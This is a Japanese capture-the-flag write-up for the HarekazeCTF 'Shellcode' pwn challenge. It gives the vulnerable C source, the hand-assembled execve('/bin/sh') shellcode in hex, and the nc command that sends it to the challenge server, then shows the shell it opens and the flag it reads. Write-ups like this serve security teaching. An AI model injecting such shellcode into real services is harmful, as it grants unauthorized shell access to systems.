# Shellcode:Pwn:154pts
nc 20.48.83.165 20005  

---

Attachments: [shellcode.zip](shellcode.zip)  

# Solution
何も考えず接続してみる。  
```bash
$ nc 20.48.83.165 20005
Present for you! "/bin/sh" is at 0x404060
Execute execve("/bin/sh", NULL, NULL)
ls
timeout: the monitored command dumped core
```
`/bin/sh`のアドレスを教えてくれる。  
配布されたzipの中のソースは以下になっていた。  
```c:shellcode.c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

char binsh[] = "/bin/sh";

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("Present for you! \"/bin/sh\" is at %p\n", binsh);
    puts("Execute execve(\"/bin/sh\", NULL, NULL)");

    char *code = mmap(NULL, 0x1000, PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    // Clear rsp and rbp
    memcpy(code, "\x48\x31\xe4\x48\x31\xed", 6);
    read(0, code + 6, 0x100);
    mprotect(code, 0x1000, PROT_READ | PROT_EXEC);

    ((void (*)())(code))();

    return 0;
}
```
PROT_EXECなのでシェルコードを実行できるようだ。  
言われたとおり`execve("/bin/sh", NULL, NULL)`を実行する。  
システムコール番号59(0x3b)をrax、引数をrdi、rsi、rdxの順で入れていく。  
rdiは先ほど表示された`/bin/sh`のアドレス(0x404060)になる。  
以下のようなアセンブリになる。  
```asm
mov    al,0x3b
movabs rdi,0x404060
xor    esi,esi
xor    rdx,rdx
syscall
```
[Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm)でhexに変換すると楽である。  
以下のようなシェルコードが完成する。  
```text
\xB0\x3B\x48\xBF\x60\x40\x40\x00\x00\x00\x00\x00\x31\xF6\x48\x31\xD2\x0F\x05
```
ncで送信する。  
```bash
$ (echo -e "\xB0\x3B\x48\xBF\x60\x40\x40\x00\x00\x00\x00\x00\x31\xF6\x48\x31\xD2\x0F\x05";cat) | nc 20.48.83.165 20005
Present for you! "/bin/sh" is at 0x404060
Execute execve("/bin/sh", NULL, NULL)
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd home
ls
shellcode
cd shellcode
ls
flag
shellcode
cat flag
HarekazeCTF{W3lc0me_7o_th3_pwn_w0r1d!}
```
シェルが得られ、flagが読み取れた。  

## HarekazeCTF{W3lc0me_7o_th3_pwn_w0r1d!}